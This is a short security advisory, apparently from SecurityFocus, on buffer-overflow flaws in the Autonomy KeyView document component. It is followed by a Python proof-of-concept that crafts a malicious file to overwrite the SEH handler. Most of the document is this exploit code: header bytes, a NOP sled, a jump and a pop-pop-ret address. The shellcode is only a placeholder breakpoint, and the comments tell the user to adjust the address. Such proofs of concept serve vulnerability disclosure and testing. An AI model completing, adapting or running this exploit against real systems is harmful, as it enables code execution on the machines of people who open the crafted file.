source: http://www.securityfocus.com/bid/26604/info

Autonomy KeyView is prone to multiple buffer-overflow vulnerabilities.

Successfully exploiting these issues could allow an attacker to execute arbitrary code in the context of the user running the application.

Multiple applications incorporate the vulnerable KeyView component, so they are also considered vulnerable to these issues.

NOTE: These issues are similar to those described in BID 26175 (Autonomy KeyView Multiple Buffer Overflow Vulnerabilities) but affect a different component.

from sys import argv
from struct import pack

def createMaliciousFile(filename):
   seh_offset = 0x9c4
   jumper     = 0x06ad890d # pop pop ret ... CHANGE IT! (dll is rebased)

   shellcode = '\x90' * 0x400 + '\xCC' # nopsled and int 3

   content  = '\x00\x00' # header record type
   content += '\x1a\x00' # header length
   content += '\x05\x10\x04\x00\x00\x00\x00\x00\x09\x00\x00\x01'
   content += '\x01\x00\x30\x8d\x01\x0a\x00\x00\x00\x00\x00\x00\x00\x00'
   content += '\x1b\x00' # vulnerable record type
   payload  = ''
   payload += '\x90' * (seh_offset - 4) #others too
   payload += '\xeb\x06\x90\x90'  # jmp six bytes forward
   payload += pack('<L', jumper)
   payload += shellcode

   content += pack('<H', len(payload))
   content += payload

   fd = open(filename, 'wb')
   fd.write(content)
   fd.close()

if len(argv) is not 2:
   print '[-] Must specify a filename. Remember to change the pop pop ret address! :)'
else:
   createMaliciousFile(argv[1])